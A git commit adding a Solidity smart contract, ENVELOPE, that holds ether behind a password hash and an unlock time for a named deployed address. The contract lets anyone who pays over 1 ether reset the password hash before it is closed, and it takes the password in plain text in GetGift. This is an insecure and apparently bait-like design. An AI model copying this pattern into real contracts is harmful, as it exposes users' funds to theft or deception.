a787c4435c1c8fcd17863f434a97f28c707232ee
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 22:54:09 +0700

    add contract ENVELOPE

---
+++ ENVELOPE.sol
@@ -0,0 +1,78 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ENVELOPE at 0x0cfA149c0a843e1f8d9bC5C6e6bebf901845CeBE
+*/
+pragma solidity ^0.4.19;
+
+contract ENVELOPE
+{
+    bytes32 public hashPass;
+    
+    bool closed = false;
+    
+    address sender;
+ 
+    uint unlockTime;
+ 
+    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00 )
+        {
+            hashPass = hash;
+            sender = msg.sender;
+            unlockTime = now;
+        }
+    }
+    
+    function SetGiftTime(uint date)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            unlockTime = date;
+        }
+    }
+    
+    function GetGift(bytes pass)
+    external
+    payable
+    canOpen
+    {
+        if(hashPass == keccak256(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function Revoce()
+    public
+    payable
+    canOpen
+    {
+        if(msg.sender==sender)
+        {
+            sender.transfer(this.balance);
+        }
+    }
+    
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(hash==hashPass&&msg.sender==sender)
+        {
+           closed=true;
+        }
+    }
+    
+    modifier canOpen
+    {
+        require(now>unlockTime);
+        _;
+    }
+    
+    function() public payable{}
+    
+}
